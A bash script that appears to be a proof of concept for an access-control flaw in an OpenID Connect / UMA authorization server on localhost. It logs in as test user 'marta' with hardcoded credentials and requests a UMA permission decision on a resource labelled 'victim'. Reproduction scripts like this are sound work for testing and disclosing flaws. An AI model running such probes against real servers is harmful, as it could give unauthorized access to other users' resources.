#!/usr/bin/env bash
set -u
base='http://127.0.0.1:8080'
realm='anypoc'
client='resource-server-test'
secret='secret'
victim='814f1ce6-e4fd-4dae-8e68-d557cc92fb96'

curl -sS -D /tmp/marta.headers -o /tmp/marta.json \
  -X POST "$base/realms/$realm/protocol/openid-connect/token" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode grant_type=password \
  --data-urlencode client_id="$client" \
  --data-urlencode client_secret="$secret" \
  --data-urlencode username=marta \
  --data-urlencode password=password
echo 'token response:'
cat /tmp/marta.json
token=$(sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p' /tmp/marta.json)
echo
echo 'UMA decision:'
curl -sS -D - -o - -X POST "$base/realms/$realm/protocol/openid-connect/token" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H "Authorization: Bearer $token" \
  --data-urlencode grant_type=urn:ietf:params:oauth:grant-type:uma-ticket \
  --data-urlencode audience="$client" \
  --data-urlencode permission="$victim#Scope A" \
  --data-urlencode response_mode=decision
